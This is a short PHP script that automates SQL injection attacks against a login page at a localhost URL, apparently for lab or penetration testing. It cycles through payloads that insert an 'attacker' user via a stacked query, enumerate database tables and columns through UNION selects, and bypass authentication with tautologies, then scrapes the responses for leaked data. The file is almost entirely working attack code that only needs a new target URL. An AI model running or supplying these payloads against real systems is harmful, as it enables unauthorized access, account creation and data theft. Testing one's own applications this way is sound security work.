
<?php
// sqli_test.php

$target = "http://localhost:8080/index.php";

$payloads = [
    "'; INSERT INTO users (username, password) VALUES ('attacker', '1234');-- ",
    "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema='public'-- ",
    "' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users' AND table_schema='public'-- ",
    "' OR '1'='1",
    "' OR 1=1--",
    "admin' #",
    "' OR EXISTS(SELECT * FROM users)--",
];

foreach ($payloads as $payload) {
    $username = urlencode($payload);
    $password = urlencode($payload);
    $url = "{$target}?username={$username}&password={$password}";

    echo "\n[+] Testando: {$payload}\n";
    $response = @file_get_contents($url);

    if ($response === false) {
        echo "[-] Errore connessione\n";
        continue;
    }

    // Verifica se c'è un errore SQL
    if (strpos($response, "SQL syntax") !== false || strpos($response, "mysql_fetch_array") !== false) {
        echo "[!] Errore SQL rilevato - Possibile vulnerabilità\n";
    }

    if (strpos($response, "ID:") !== false) {
        echo "[!] VULNERABILE!\n";
        preg_match_all('/<div class="error".*?>(.*?)<\/div>/s', $response, $matches);
        foreach ($matches[1] as $result) {
            if (strpos($result, "Credenziali non valide") === false) {
                echo "    " . trim(strip_tags($result)) . "\n";
            }
        }
    } else {
        echo "[-] Nessun risultato visibile\n";
    }
    echo "-----------------------------\n";
}
?>